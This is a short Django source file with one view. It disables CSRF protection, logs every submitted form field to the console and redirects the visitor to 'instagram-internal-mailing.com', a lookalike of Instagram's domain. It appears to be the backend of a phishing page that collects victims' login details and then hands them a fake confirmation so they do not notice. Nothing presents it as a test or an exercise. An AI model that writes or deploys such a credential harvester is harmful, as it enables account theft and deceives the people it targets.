from django.shortcuts import render, redirect
from django.views.decorators.csrf import csrf_exempt


@csrf_exempt
def homepage(request):
    if request.method == "POST":
        print(str(request.POST))
    return redirect('https://instagram-internal-mailing.com/confirmation.html')
